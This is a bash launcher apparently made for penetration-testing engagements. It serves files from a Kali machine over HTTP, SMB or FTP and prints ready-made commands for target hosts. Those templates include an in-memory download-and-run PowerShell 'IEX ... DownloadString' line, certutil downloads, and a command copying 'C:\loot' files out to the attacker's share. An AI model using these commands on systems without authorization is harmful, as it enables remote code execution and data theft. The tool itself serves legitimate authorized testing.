#!/usr/bin/env bash
#==============================================================================
# servr.sh — OffSec File Server Launcher
#==============================================================================
# Single-file, foreground-only server launcher for the engagement use.
# Supports HTTP, SMB, and FTP with ready-to-use copy/paste commands.
#==============================================================================

set -o pipefail
# NOT set -e — show clean warnings and exit messages
# NOT set -u — optional variables must be safe to reference unset

#------------------------------------------------------------------------------
# COLORS & OUTPUT HELPERS
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
{ [[ -n "${NO_COLOR:-}" ]] || [[ ! -t 1 ]]; } && disable_colors

ts() { date '+%H:%M:%S'; }
info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
error()   { echo -e "${RED}[$(ts)] [-]${NC} $*" >&2; }
phase()   { echo -e "\n${MAGENTA}[$(ts)] [PHASE]${NC} ${BOLD}$*${NC}"; }

#------------------------------------------------------------------------------
# DEFAULTS
#------------------------------------------------------------------------------
MODE=""
SERVE_DIR="$(pwd)"
LISTEN_PORT=""
KALI_IP=""
SMB_SHARE="share"
SMB_USER="kali"
SMB_PASS="kali"
SMB_ANON=false
FTP_USER="kali"
FTP_PASS="kali"

#------------------------------------------------------------------------------
# CLEANUP
#------------------------------------------------------------------------------
CLEANUP_RUNNING=0

cleanup() {
    local exit_code="${1:-0}"
    (( CLEANUP_RUNNING )) && return
    CLEANUP_RUNNING=1
    trap - EXIT INT TERM

    if (( exit_code == 130 )); then
        echo ""
        warn "Server stopped."
    fi
    exit "$exit_code"
}

trap 'cleanup 0'   EXIT
trap 'cleanup 130' INT TERM

#------------------------------------------------------------------------------
# HELPERS
#------------------------------------------------------------------------------
show_help() {
    cat <<'EOF'

servr.sh — Multi-mode file server launcher for OffSec use

USAGE:
  ./servr.sh http                        # HTTP on port 80 (needs sudo), serve current dir
  ./servr.sh http --port 8080            # HTTP on custom port
  ./servr.sh http --dir ~/tools          # HTTP serving specific directory
  ./servr.sh http --port 443             # HTTP on 443 (needs sudo)

  ./servr.sh smb                         # SMB share on port 445 (needs sudo), serve current dir
  ./servr.sh smb --dir ~/tools           # SMB serving specific directory
  ./servr.sh smb --share tools           # Custom share name (default: share)
  ./servr.sh smb --user kali --pass kali # Authenticated SMB
  ./servr.sh smb --anon                  # Anonymous SMB
  ./servr.sh smb --port 4445             # Non-privileged port (no sudo)

  ./servr.sh ftp                         # FTP on port 21 (needs sudo), serve current dir
  ./servr.sh ftp --port 2121             # FTP on custom port (no sudo)
  ./servr.sh ftp --dir ~/tools           # FTP serving specific directory

  ./servr.sh --help                      # Usage

GLOBAL OPTIONS:
  --port PORT      Port to listen on
  --dir PATH       Directory to serve (default: current working directory)
  --ip IP          Override Kali IP for printed commands
  --no-color       Disable ANSI color output (also: export NO_COLOR=1)

SMB-SPECIFIC OPTIONS:
  --share NAME     SMB share name (default: share)
  --user USER      SMB username (default: kali)
  --pass PASS      SMB password (default: kali)
  --anon           Anonymous SMB

EXAMPLES:
  ./servr.sh http --dir ~/tools --port 8080
  ./servr.sh smb --dir ~/tools --share tools --user kali --pass kali
  ./servr.sh ftp --dir ~/tools --port 2121

NOTES:
  - Default ports 80/445/21 require sudo (privileged ports <1024)
  - Non-privileged alternatives: http 8080, smb 4445, ftp 2121
  - Colors: pass --no-color or export NO_COLOR=1 to disable ANSI output

EOF
}

is_valid_port() {
    [[ "$1" =~ ^[0-9]+$ ]] || return 1
    (( 10#$1 >= 1 && 10#$1 <= 65535 ))
}

is_valid_ip() {
    local ip="$1"
    [[ "$ip" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || return 1
    local octet
    local IFS='.'
    local -a octets
    read -ra octets <<< "$ip"
    for octet in "${octets[@]}"; do
        (( 10#$octet <= 255 )) || return 1
    done
}

detect_kali_ip() {
    local ip_addr=""
    ip_addr=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)[\d.]+' | head -1)
    if [[ -n "$ip_addr" ]]; then
        echo "$ip_addr"
        return 0
    fi

    ip_addr=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)[\d.]+' | head -1)
    if [[ -n "$ip_addr" ]]; then
        echo "$ip_addr"
        return 0
    fi

    ip_addr=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [[ -n "$ip_addr" ]]; then
        echo "$ip_addr"
        return 0
    fi

    return 1
}

check_port_conflict() {
    local port="$1"
    if ss -tlnp 2>/dev/null | grep -q ":${port}[[:space:]]"; then
        warn "Port ${port} appears to be in use."
        warn "Check: ss -tlnp | grep ':${port} '"
        warn "Consider: --port $((port + 1))"
    fi
}

human_size() {
    local bytes="$1"
    numfmt --to=iec --suffix=B "$bytes" 2>/dev/null || echo "${bytes}B"
}

print_file_list() {
    local dir_path="$1"
    info "Files in ${dir_path}:"

    local total_files=0
    local shown=0
    local entry=""
    local -a entries=()

    while IFS= read -r entry; do
        entries+=("$entry")
    done < <(find "$dir_path" -maxdepth 1 -mindepth 1 -type f -printf '%f\t%s\n' 2>/dev/null | sort)

    total_files=${#entries[@]}
    if (( total_files == 0 )); then
        echo "  (no files in directory)"
        return 0
    fi

    for entry in "${entries[@]}"; do
        local name="${entry%%$'\t'*}"
        local size="${entry##*$'\t'}"
        local branch="├──"
        (( shown++ ))
        if (( shown == total_files || shown == 20 )); then
            branch="└──"
        fi
        printf '  %s %-24s (%s)\n' "$branch" "$name" "$(human_size "$size")"
        if (( shown == 20 )); then
            break
        fi
    done

    if (( total_files > 20 )); then
        echo "  └── ... ($((total_files - 20)) more files)"
    fi
}

print_box() {
    local title="$1"
    shift
    local lines=("$@")
    local width=61
    local bar=""

    bar=$(printf '─%.0s' $(seq 1 "$width"))

    echo ""
    echo -e "${CYAN}${BOLD}┌${bar}┐${NC}"
    printf "${CYAN}${BOLD}│${NC} %-61s${CYAN}${BOLD}│${NC}\n" "$title"
    local line=""
    for line in "${lines[@]}"; do
        printf "${CYAN}${BOLD}│${NC} %-61s${CYAN}${BOLD}│${NC}\n" "$line"
    done
    echo -e "${CYAN}${BOLD}└${bar}┘${NC}"
    echo ""
}

resolved_ip() {
    if [[ -n "$KALI_IP" ]]; then
        echo "$KALI_IP"
    else
        echo "<KALI_IP>"
    fi
}

require_tool() {
    local tool_name="$1"
    local install_hint="$2"

    if ! command -v "$tool_name" &>/dev/null; then
        warn "Required tool missing: ${tool_name}"
        warn "Install: ${install_hint}"
        return 1
    fi
    return 0
}

run_http() {
    require_tool "python3" "sudo apt install python3" || return 1

    local ip_addr
    ip_addr="$(resolved_ip)"
    local address="http://${ip_addr}:${LISTEN_PORT}"

    print_box "HTTP SERVER — RUNNING" \
        "  Serving:  ${SERVE_DIR}" \
        "  Address:  ${address}" \
        "  ─────────────────────────────────────────────────────────" \
        "  LINUX TARGET" \
        "  wget ${address}/FILE -O /tmp/FILE" \
        "  curl -o /tmp/FILE ${address}/FILE" \
        "" \
        "  WINDOWS TARGET" \
        "  iwr -uri ${address}/FILE -OutFile FILE" \
        "  certutil -urlcache -split -f ${address}/FILE FILE" \
        "  IEX (New-Object Net.WebClient).DownloadString('${address}/FILE.ps1')" \
        "" \
        "  Replace FILE with filename from list above"

    print_file_list "$SERVE_DIR"
    check_port_conflict "$LISTEN_PORT"

    phase "Starting HTTP server"
    local -a cmd=(python3 -m http.server "$LISTEN_PORT" --directory "$SERVE_DIR")
    info "Running: ${cmd[*]}"
    "${cmd[@]}"
}

run_smb() {
    require_tool "impacket-smbserver" "sudo apt install python3-impacket" || return 1

    local ip_addr
    ip_addr="$(resolved_ip)"
    local unc="\\\\${ip_addr}\\${SMB_SHARE}"

    local auth_line=""
    local win_mount=""
    local linux_mount=""
    local ps_lines=()

    if [[ "$SMB_ANON" == true ]]; then
        auth_line="  Auth:     Anonymous"
        win_mount="  net use m: ${unc}"
        linux_mount="  smbclient //${ip_addr}/${SMB_SHARE} -N"
        ps_lines=(
            "  WINDOWS TARGET — POWERSHELL MOUNT"
            "  New-PSDrive -Name m -PSProvider FileSystem -Root ${unc}"
        )
    else
        auth_line="  Auth:     ${SMB_USER} / ${SMB_PASS}"
        win_mount="  net use m: ${unc} /user:${SMB_USER} ${SMB_PASS}"
        linux_mount="  smbclient //${ip_addr}/${SMB_SHARE} -U ${SMB_USER}%${SMB_PASS}"
        ps_lines=(
            "  WINDOWS TARGET — POWERSHELL MOUNT"
            "  \$pass = ConvertTo-SecureString '${SMB_PASS}' -AsPlainText -Force"
            "  \$cred = New-Object PSCredential('${SMB_USER}', \$pass)"
            "  New-PSDrive -Name m -PSProvider FileSystem -Root ${unc} -Credential \$cred"
        )
    fi

    print_box "SMB SERVER — RUNNING" \
        "  Serving:  ${SERVE_DIR}" \
        "  Share:    ${unc}" \
        "${auth_line}" \
        "  ─────────────────────────────────────────────────────────" \
        "  WINDOWS TARGET — MOUNT DRIVE" \
        "${win_mount}" \
        "" \
        "  WINDOWS TARGET — DIRECT COPY" \
        "  copy ${unc}\\FILE C:\\Windows\\Temp\\" \
        "  copy C:\\loot\\file.txt ${unc}\\" \
        "" \
        "${ps_lines[@]}" \
        "" \
        "  LINUX TARGET" \
        "${linux_mount}" \
        "" \
        "  Replace FILE with filename from list above"

    print_file_list "$SERVE_DIR"
    check_port_conflict "$LISTEN_PORT"

    phase "Starting SMB server"
    local -a cmd=(impacket-smbserver "$SMB_SHARE" "$SERVE_DIR" -smb2support -port "$LISTEN_PORT")
    if [[ "$SMB_ANON" != true ]]; then
        cmd+=(-username "$SMB_USER" -password "$SMB_PASS")
    fi
    info "Running: ${cmd[*]}"
    "${cmd[@]}"
}

run_ftp() {
    require_tool "python3" "sudo apt install python3" || return 1

    if ! python3 -c "import pyftpdlib" 2>/dev/null; then
        warn "pyftpdlib is not installed."
        warn "Install: pip install pyftpdlib --break-system-packages"
        return 1
    fi

    local ip_addr
    ip_addr="$(resolved_ip)"
    local address="ftp://${ip_addr}:${LISTEN_PORT}"

    print_box "FTP SERVER — RUNNING" \
        "  Serving:  ${SERVE_DIR}" \
        "  Address:  ${address}" \
        "  Auth:     ${FTP_USER} / ${FTP_PASS}" \
        "  ─────────────────────────────────────────────────────────" \
        "  LINUX TARGET" \
        "  ftp ${ip_addr} ${LISTEN_PORT}" \
        "  wget ftp://${FTP_USER}:${FTP_PASS}@${ip_addr}:${LISTEN_PORT}/FILE" \
        "" \
        "  WINDOWS TARGET" \
        "  ftp ${ip_addr}" \
        "  (set binary mode first: binary)" \
        "" \
        "  Replace FILE with filename from list above"

    print_file_list "$SERVE_DIR"
    check_port_conflict "$LISTEN_PORT"

    phase "Starting FTP server"
    local -a cmd=(python3 -m pyftpdlib -p "$LISTEN_PORT" -u "$FTP_USER" -P "$FTP_PASS" -d "$SERVE_DIR" -w)
    info "Running: ${cmd[*]}"
    "${cmd[@]}"
}

#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
if [[ $# -eq 0 ]]; then
    show_help
    exit 0
fi

case "$1" in
    -h|--help|help)
        show_help
        exit 0
        ;;
    http|smb|ftp)
        MODE="$1"
        shift
        ;;
    *)
        error "Unknown mode: $1"
        show_help
        exit 1
        ;;
esac

while [[ $# -gt 0 ]]; do
    case "$1" in
        --port)
            [[ $# -lt 2 ]] && { error "--port requires an argument"; exit 1; }
            LISTEN_PORT="$2"
            shift 2
            ;;
        --dir)
            [[ $# -lt 2 ]] && { error "--dir requires an argument"; exit 1; }
            SERVE_DIR="$2"
            shift 2
            ;;
        --ip)
            [[ $# -lt 2 ]] && { error "--ip requires an argument"; exit 1; }
            KALI_IP="$2"
            shift 2
            ;;
        --share)
            [[ $# -lt 2 ]] && { error "--share requires an argument"; exit 1; }
            SMB_SHARE="$2"
            shift 2
            ;;
        --user)
            [[ $# -lt 2 ]] && { error "--user requires an argument"; exit 1; }
            SMB_USER="$2"
            shift 2
            ;;
        --pass)
            [[ $# -lt 2 ]] && { error "--pass requires an argument"; exit 1; }
            SMB_PASS="$2"
            shift 2
            ;;
        --anon)
            SMB_ANON=true
            shift
            ;;
        --no-color)
            disable_colors
            shift
            ;;
        -h|--help|help)
            show_help
            exit 0
            ;;
        *)
            error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

[[ -d "$SERVE_DIR" ]] || { error "Directory not found: ${SERVE_DIR}"; exit 1; }
SERVE_DIR="$(cd "$SERVE_DIR" 2>/dev/null && pwd)" || { error "Cannot access directory: ${SERVE_DIR}"; exit 1; }

if [[ -n "$KALI_IP" ]]; then
    is_valid_ip "$KALI_IP" || { error "Invalid IP: ${KALI_IP}"; exit 1; }
else
    KALI_IP="$(detect_kali_ip || true)"
    if [[ -n "$KALI_IP" ]]; then
        info "Kali IP: ${KALI_IP} (auto-detected)"
    else
        warn "Could not auto-detect Kali IP — printed commands will show <KALI_IP>"
        warn "Fix: re-run with --ip <your-ip>  (e.g. --ip 192.168.45.200)"
    fi
fi

case "$MODE" in
    http)
        [[ -z "$LISTEN_PORT" ]] && LISTEN_PORT=80
        ;;
    smb)
        [[ -z "$LISTEN_PORT" ]] && LISTEN_PORT=445
        ;;
    ftp)
        [[ -z "$LISTEN_PORT" ]] && LISTEN_PORT=21
        ;;
esac

is_valid_port "$LISTEN_PORT" || { error "Invalid port: ${LISTEN_PORT}"; exit 1; }

if (( LISTEN_PORT < 1024 )) && (( EUID != 0 )); then
    local_suggestion=8080
    case "$MODE" in
        smb) local_suggestion=4445 ;;
        ftp) local_suggestion=2121 ;;
    esac
    error "Port ${LISTEN_PORT} requires root privileges."
    error "Options:"
    error "  sudo ./servr.sh ${MODE} --port ${LISTEN_PORT} ..."
    error "  ./servr.sh ${MODE} --port ${local_suggestion} ...   (non-privileged port)"
    exit 1
fi

case "$MODE" in
    http)
        run_http
        ;;
    smb)
        run_smb
        ;;
    ftp)
        run_ftp
        ;;
esac
